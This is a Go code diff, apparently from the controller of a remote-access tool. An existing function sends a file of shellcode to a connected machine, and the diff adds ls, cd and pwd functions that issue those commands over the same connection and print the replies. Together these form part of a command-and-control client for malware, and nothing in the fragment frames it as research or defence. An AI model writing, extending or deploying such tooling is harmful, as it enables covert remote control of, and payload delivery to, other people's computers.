@@ -119,3 +119,46 @@ func load(conn *net.Conn, fileWShellcode string) {
 	(*conn).Write([]byte("barCode\n"))
 	(*conn).Write(file)
 }
+
+func ls(conn *net.Conn) {
+	(*conn).Write([]byte("ls\n"))
+	request := make([]byte, 99999)
+	read_len, err := (*conn).Read(request)
+	if read_len == 0 {
+		(*conn).Close()
+		fmt.Println("Error")
+		return
+	}
+	if err != nil {
+		(*conn).Close()
+		fmt.Println("Error")
+		return
+	}
+	reply := string(request[:read_len])
+	fmt.Println(reply)
+}
+
+func cd(conn *net.Conn, dir2go string) {
+	(*conn).Write([]byte("cd\n"))
+	(*conn).Write([]byte("cd " + dir2go))
+}
+
+func pwd(conn *net.Conn) {
+	(*conn).Write([]byte("pwd\n"))
+	request := make([]byte, 99999)
+	read_len, err := (*conn).Read(request)
+	if read_len == 0 {
+		(*conn).Close()
+		fmt.Println("Error")
+		return
+	}
+	if err != nil {
+		(*conn).Close()
+		fmt.Println("Error")
+		return
+	}
+	reply := string(request[:read_len])
+	fmt.Println()
+	fmt.Println(reply)
+	fmt.Println()
+}
